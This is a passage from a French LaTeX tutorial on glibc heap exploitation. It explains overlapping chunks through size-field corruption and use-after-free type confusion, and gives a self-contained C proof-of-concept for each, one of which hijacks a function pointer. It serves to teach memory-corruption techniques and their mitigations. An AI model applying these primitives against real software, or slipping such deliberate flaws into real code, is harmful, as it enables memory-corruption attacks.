\subsection{Altération Structurelle : Consolidation et Chevauchement}

La prédictibilité de l’allocateur permet de remodeler la géométrie du tas.
En manipulant les métadonnées des chunks, on peut forcer \texttt{malloc} à
consolider ou allouer la mémoire d’une manière non prévue. Lorsqu’elle est
déclenchée sur des métadonnées corrompues, la consolidation (forward ou
backward) devient un vecteur de corruption structurelle.
Elle peut englober des chunks encore utilisés dans des zones considérées comme libres par
l’allocateur.


\subsubsection{Overlapping Chunks}

\noindent\textbf{Fichier de Référence :} \href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/overlapping_chunks.c}{\texttt{overlapping\_chunks.c}}

\paragraph{Vue d'ensemble :}
L’overlapping de chunks repose sur la corruption du champ \texttt{size} d’un chunk,
généralement via un heap overflow. En augmentant artificiellement cette taille,
le chunk s’étend et englobe un ou plusieurs chunks adjacents pourtant déjà alloués.
Lors de sa libération ou de sa réallocation, ce chunk étendu crée alors un
chevauchement.
Plusieurs pointeurs distincts se retrouvent à référencer une
même zone mémoire, chacun avec une vue différente (par exemple des structures
logiques indépendantes).

\paragraph{Fonctionnement de l'attaque :}
\begin{enumerate}
    \item \textbf{Allocation initiale :} L'attaquant alloue plusieurs chunks consécutifs (par exemple \texttt{p1}, \texttt{p2}, \texttt{p3}).
    \item \textbf{Corruption de la taille :} En utilisant une vulnérabilité (heap overflow) sur le premier chunk libre ou en débordant, il écrase les métadonnées de \texttt{p2} pour augmenter artificiellement sa taille, de façon à ce qu'elle englobe \texttt{p3}.
    \item \textbf{Libération et Réallocation :} Le chunk \texttt{p2} est libéré. L'allocateur (croyant que le chunk est plus grand) le place dans l'Unsorted Bin. Lors d'une nouvelle allocation de la taille corrompue, un nouveau chunk est retourné qui chevauche physiquement \texttt{p3}.
\end{enumerate}

\paragraph{Démonstration par le code :}

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

int main() {
    // 1. Allocation de 3 chunks consécutifs
    long *p1 = malloc(0x80 - 8);
    long *p2 = malloc(0x500 - 8);
    long *p3 = malloc(0x80 - 8);
    malloc(0x10); // Guard chunk

    memset(p1, '1', 0x80 - 8);
    memset(p2, '2', 0x500 - 8);
    memset(p3, '3', 0x80 - 8);
    
    // 2. Vulnérabilité : Overflow modifiant la taille de p2
    // On l'augmente à 0x581 pour englober p3 (0x500 + 0x80 | PREV_INUSE).
    *(p2 - 1) = 0x581; 

    // 3. Libération de p2 avec sa nouvelle taille corrompue
    free(p2);

    // 4. Réallocation couvrant la zone corrompue
    // p4 pointera sur l'ancienne adresse de p2 et englobera p3.
    long *p4 = malloc(0x580 - 8);

    // p4 et p3 se chevauchent (deux pointeurs sur la même zone).
    memset(p4, '4', 0x580 - 8);
    memset(p3, '3', 80);

    // Vérifie que les données écrites dans p3 se retrouvent bien dans p4
    assert(strstr((char *)p4, (char *)p3));
    
    return 0;
}
\end{minted}

\paragraph{Limitations et renforcement de la GLIBC :}
La technique a été mitigée par l'ajout de vérifications strictes d'intégrité lors de la manipulation des chunks. Actuellement, la GLIBC s'assure que le chunk suivant (calculé avec la nouvelle taille étendue) a bien son bit \texttt{PREV\_INUSE} ou correspond bien aux alignements prévus, et procède à des vérifications de correspondance entre la taille annoncée et le champ \texttt{prev\_size}. Créer les bonnes conditions demande de maîtriser la structure environnante de la mémoire.

\subsection{Exploitation au niveau applicatif}

\subsubsection{Use-After-Free et Type Confusion}

\paragraph{Vue d'ensemble:}
Face aux protections des métadonnées de la GLIBC (comme le \textit{Safe Linking}), corrompre directement l'allocateur est devenu complexe. Une alternative plus fiable consiste à ignorer les mécanismes internes de \texttt{malloc} pour cibler plutôt la logique interne de l'application via une confusion de type (\textit{Type Confusion}). Cette attaque est particulièrement puissante car elle détourne le comportement du programme lui-même sans avoir besoin d'interagir avec les métadonnées protégées de la GLIBC.

\paragraph{Fonctionnement de l'attaque:}
L'exploit le plus commun repose sur l'exploitation d'une vulnérabilité \textit{Use-After-Free}. La technique consiste à allouer une structure légitime, la libérer sans effacer son pointeur (créant ainsi un \textit{dangling pointer}), puis allouer une structure de taille identique mais de type différent. L'allocateur retournera l'ancien bloc mémoire. L'attaquant peut alors écrire des données arbitraires avec la seconde structure et détourner le flot d'exécution lorsque le programme tentera d'utiliser la première structure.

\paragraph{Démonstration par le code:}

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
    void (*execute)();    // 8 octets
    char description[24]; // 24 octets (Total: 32 octets)
} task_t;

typedef struct {
    char content[32];     // Total: 32 octets
} message_t;

void win() {
    puts("Hijack réussi : Exécution de la fonction cible");
}

void lose() {
    puts("Exécution normale");
}

int main() {
    // 1. Allocation initiale
    task_t *task = malloc(sizeof(task_t));
    task->execute = lose;

    // 2. Libération et création d'un dangling pointer
    free(task);

    // 3. Réallocation et Type Confusion
    // Les deux structures font exactement la même taille (32 octets)
    // malloc va donc réutiliser le chunk qui vient d'être libéré
    message_t *msg = malloc(sizeof(message_t));

    // Injection du payload
    *(long *)msg->content = (long)win;

    // 4. Déclenchement (Trigger)
    task->execute(); 

    return 0;
}
\end{minted}

\paragraph{Interprétation de la corruption :}
\begin{enumerate}
    \item \textbf{Allocation initiale} : Un objet de type \texttt{task\_t} est alloué. Cette structure contient un pointeur de fonction \texttt{execute} initialisé sur \texttt{lose}.
    \item \textbf{Libération} : L'objet \texttt{task} est libéré avec \texttt{free}, mais son pointeur n'est pas mis à \texttt{NULL}.
    \item \textbf{Type Confusion} : Un nouvel objet de type \texttt{message\_t} est alloué. Les deux structures faisant la même taille (32 octets), \texttt{malloc} retourne l'ancien bloc mémoire contenant \texttt{task}. L'attaquant injecte l'adresse de la fonction \texttt{win} au début du buffer de \texttt{msg}.
    \item \textbf{Trigger} : Le programme tente d'exécuter la fonction pointée par \texttt{task->execute}. Comme le bloc mémoire a été écrasé par le contenu de la structure \texttt{message\_t}, c'est la fonction \texttt{win} qui se retrouve exécutée.
\end{enumerate}
